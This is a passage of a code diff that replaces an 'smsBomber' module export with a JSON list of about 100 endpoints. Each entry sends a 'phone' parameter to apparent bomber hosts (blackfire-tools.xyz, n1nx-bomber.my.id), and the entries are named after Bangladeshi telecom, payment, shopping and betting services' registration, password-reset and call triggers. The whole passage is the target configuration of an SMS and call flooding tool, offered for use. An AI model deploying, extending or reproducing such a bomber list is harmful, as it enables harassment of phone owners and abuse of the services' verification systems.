+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "119",
+        "name": "fundesh.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/fundesh.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "120",
+        "name": "ghuri.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/ghuri.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "121",
+        "name": "gibinfo.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/gibinfo.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "122",
+        "name": "gp.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/gp.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "123",
+        "name": "gpay.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/gpay.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "124",
+        "name": "gpfi.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/gpfi.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "125",
+        "name": "gpshop.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/gpshop.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "126",
+        "name": "grameendh.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/grameendh.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "127",
+        "name": "helth-login.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/helth-login.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "128",
+        "name": "helth-reg.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/helth-reg.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "129",
+        "name": "helth.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/helth.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "130",
+        "name": "hisab-express.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/hisab-express.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "131",
+        "name": "hisabereg.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/hisabereg.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "132",
+        "name": "hlpl.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/hlpl.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "133",
+        "name": "hoichoi.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/hoichoi.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "134",
+        "name": "iqra.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/iqra.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "135",
+        "name": "ivr.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/ivr.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "136",
+        "name": "jatri.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/jatri.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "137",
+        "name": "jeetwinbd.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/jeetwinbd.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "138",
+        "name": "jotno.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/jotno.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "139",
+        "name": "kabbik.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/kabbik.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "140",
+        "name": "kirebd.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/kirebd.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "141",
+        "name": "kormi24.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/kormi24.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "142",
+        "name": "lazzpharma.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/lazzpharma.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "143",
+        "name": "ibfl.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/ibfl.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "144",
+        "name": "loan.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/loan.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "145",
+        "name": "mcbaffiliate.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/mcbaffiliate.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "146",
+        "name": "mithai.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/mithai.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "147",
+        "name": "mojaenglish.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/mojaenglish.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "148",
+        "name": "mokam.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/mokam.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "149",
+        "name": "moveon.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/moveon.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "150",
+        "name": "mygp.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/mygp.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "151",
+        "name": "nbkash-gp.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/nbkash-gp.php?phone=*****",
+        "method": "post",
+        "body": "",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "152",
+        "name": "nbkash-ra.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/nbkash-ra.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "153",
+        "name": "nesco.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/nesco.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "154",
+        "name": "niloyhero.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/niloyhero.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "155",
+        "name": "obhai.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/obhai.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "156",
+        "name": "ousodhpotro.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/ousodhpotro.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "157",
+        "name": "paperflay.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/paperflay.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "158",
+        "name": "pathao.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/pathao.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "159",
+        "name": "portpos.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/portpos.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "160",
+        "name": "pravanahelth.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/pravanahelth.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "161",
+        "name": "qcom.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/qcom.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "162",
+        "name": "quizgiri.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/quizgiri.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "163",
+        "name": "quiztime.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/quiztime.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "164",
+        "name": "redx.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/redx.php?phone=*****",
+        "method": "post",
+        "body": "",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "165",
+        "name": "redx2.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/redx2.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "166",
+        "name": "reseller-circel.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/reseller-circel.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "167",
+        "name": "robi-ivr-dorstep.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/robi-ivr-dorstep.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "168",
+        "name": "robi-myoffer.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/robi-myoffer.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "169",
+        "name": "robi-sim.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/robi-sim.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "170",
+        "name": "robi-web.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/robi-web.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "171",
+        "name": "robi-web2.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/robi-web2.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "172",
+        "name": "rootsedu-forget.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/rootsedu-forget.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "173",
+        "name": "rootsedu-reg.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/rootsedu-reg.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "174",
+        "name": "rtv-forget.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/rtv-forget.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "175",
+        "name": "rtv-reg.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/rtv-reg.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "176",
+        "name": "runcash.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/runcash.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "177",
+        "name": "sadhin.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/sadhin.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "178",
+        "name": "sajgoj.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/sajgoj.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "179",
+        "name": "saralifestyle.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/saralifestyle.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "180",
+        "name": "sebaxyz.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/sebaxyz.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "181",
+        "name": "senorbeuty.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/senorbeuty.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "182",
+        "name": "sikho.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/sikho.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "183",
+        "name": "skitto.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/skitto.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "184",
+        "name": "somvob.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/somvob.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "185",
+        "name": "sopoth-reg.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/sopoth-reg.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "186",
+        "name": "sopoth-resend.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/sopoth-resend.phpp?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "187",
+        "name": "stedfast.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/stedfast.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "188",
+        "name": "sudokkho.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/sudokkho.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "189",
+        "name": "sundarban.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/sundarban.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "190",
+        "name": "talikhata.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/talikhata.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "191",
+        "name": "tap.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/tap.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "192",
+        "name": "thebodyshop.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/thebodyshop.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "193",
+        "name": "tota.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/tota.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "194",
+        "name": "toybox.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/toybox.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "195",
+        "name": "trusty.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/trusty.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "196",
+        "name": "win2gain.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/win2gain.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "197",
+        "name": "babu88-capcha.php",
+        "url": "https:\/\/api.n1nx-bomber.my.id\/call\/babu88-forget.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "198",
+        "name": "babu88-capcha.php",
+        "url": "https:\/\/api.n1nx-bomber.my.id\/call\/babu88-reg.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "199",
+        "name": "bhaggo-forget.php",
+        "url": "https:\/\/api.n1nx-bomber.my.id\/call\/bhaggo-forget.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "200",
+        "name": "bhaggo-reg.php",
+        "url": "https:\/\/api.n1nx-bomber.my.id\/call\/bhaggo-reg.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "201",
+        "name": "crazy-forget.php",
+        "url": "https:\/\/api.n1nx-bomber.my.id\/call\/crazy-forget.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "202",
+        "name": "crazy-reg.php",
+        "url": "https:\/\/api.n1nx-bomber.my.id\/call\/crazy-reg.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "203",
+        "name": "krikaya-forget.php",
+        "url": "https:\/\/api.n1nx-bomber.my.id\/call\/krikaya-forget.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "204",
+        "name": "krikaya-reg.php",
+        "url": "https:\/\/api.n1nx-bomber.my.id\/call\/krikaya-reg.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "205",
+        "name": "nagad88-forget.php",
+        "url": "https:\/\/api.n1nx-bomber.my.id\/call\/nagad88-forget.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "206",
+        "name": "nagad88-reg.php",
+        "url": "https:\/\/api.n1nx-bomber.my.id\/call\/nagad88-reg.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "207",
+        "name": "Call1",
+        "url": "https:\/\/api.blackfire-tools.xyz\/call\/babu88-forget.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "208",
+        "name": "call2",
+        "url": "https:\/\/api.blackfire-tools.xyz\/call\/babu88-reg.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "209",
+        "name": "call3",
+        "url": "https:\/\/api.blackfire-tools.xyz\/call\/bhaggo-forget.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "210",
+        "name": "Call4",
+        "url": "https:\/\/api.blackfire-tools.xyz\/call\/bhaggo-reg.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "211",
+        "name": "Call5",
+        "url": "https:\/\/api.blackfire-tools.xyz\/call\/crazy-forget.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "212",
+        "name": "Call6",
+        "url": "https:\/\/api.blackfire-tools.xyz\/call\/crazy-reg.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "213",
+        "name": "Call7",
+        "url": "https:\/\/api.blackfire-tools.xyz\/call\/krikaya-forget.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "214",
+        "name": "Call8",
+        "url": "https:\/\/api.blackfire-tools.xyZ\/call\/krikaya-reg.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "215",
+        "name": "Call9",
+        "url": "https:\/\/api.blackfire-tools.xyz\/call\/nagad88-forget.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "216",
+        "name": "Call10",
+        "url": "https:\/\/api.blackfire-tools.xyz\/call\/nagad88-reg.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
     }
-}
-
-module.exports = {
-    smsBomber
+]
 }
